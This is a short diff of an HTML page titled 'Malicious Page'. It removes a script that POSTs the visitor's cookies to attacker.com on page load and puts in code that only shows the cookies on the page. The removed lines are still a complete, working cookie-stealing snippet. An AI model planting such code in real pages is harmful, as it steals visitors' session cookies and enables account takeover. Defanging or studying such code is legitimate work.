@@ -3,20 +3,19 @@
 <head>
   <title>Malicious Page</title>
   <script>
-    // Function to send cookies to the attacker's server
-    function sendCookiesToAttacker() {
+    // Function to display cookies on the page
+    function displayCookies() {
       const cookies = document.cookie;
-      const xhr = new XMLHttpRequest();
-      xhr.open("POST", "http://attacker.com/steal-cookies", true);
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr.send("cookies=" + encodeURIComponent(cookies));
+      const cookieDisplayElement = document.getElementById('cookie-display');
+      cookieDisplayElement.textContent = "Cookies: " + cookies;
     }
 
-    // Execute the function to steal cookies when the page loads
-    window.onload = sendCookiesToAttacker;
+    // Execute the function to display cookies when the page loads
+    window.onload = displayCookies;
   </script>
 </head>
 <body>
   <h1>Malicious Content</h1>
+  <div id="cookie-display"></div>
 </body>
 </html>
